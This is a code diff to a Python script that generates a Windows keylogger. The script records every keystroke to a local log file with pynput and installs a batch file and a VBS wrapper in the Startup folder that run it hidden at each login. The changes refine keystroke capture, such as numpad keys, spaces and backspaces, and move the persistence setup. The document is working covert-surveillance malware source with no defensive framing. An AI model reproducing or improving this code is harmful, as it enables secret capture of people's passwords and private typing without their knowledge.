@@ -9,15 +9,30 @@ pwd = f"C:/Users/{user}/keylogger"
 os.chdir(pwd)
 file_path = fr"'C:/Users/{user}/keylogger/log.txt'"
 logger = fr'''from pynput import keyboard
-
+numpad_map = {{
+    "<96>":'0',
+    "<97>":"1",
+    "<98>":"2",
+    "<99>":"3",
+    "<100>":"4",
+    "<101>":"5",
+    "<102>":"6",
+    "<103>":"7",
+    "<104>":"8",
+    "<105>":"9"
+}}
 def on_press(key):
     with open({file_path},'a+') as f:
         try:
             f.write(key.char)  
         except AttributeError as e:
-            f.write(str(key)+" ")
+            if key == keyboard.Key.space:
+                f.write(" ")
+            if key == keyboard.Key.backspace:
+                f.write(" "+str(key)+" ")
         except Exception as e:
-            f.write(str(key)+" ")
+            if str(key) in numpad_map.keys():
+                f.write(numpad_map[str(key)])
 
 
 if __name__=="__main__":
@@ -26,16 +41,13 @@ if __name__=="__main__":
     ) as l:
         l.join()'''
 
-bat = fr'''del "{startup}\log.vbs"
-"{sys.executable}" C:\Users\{user}\keylogger\keylogger.py
-echo set code = CreateObject("WScript.shell")>log.vbs
-echo code.Run "C:\Users\{user}\keylogger\keylogger.bat",0,False>>log.vbs'''
+startup = fr"C:\Users\{user}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+bat = fr'''"{sys.executable}" C:\Users\{user}\keylogger\keylogger.py'''
 
 vbs = fr'''set code = CreateObject("WScript.shell")
 code.Run "C:\Users\{user}\keylogger\keylogger.bat",0,False'''
 
 
-startup = fr"C:\Users\{user}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 
 with open("keylogger.py",'w') as f:
     f.write(logger)
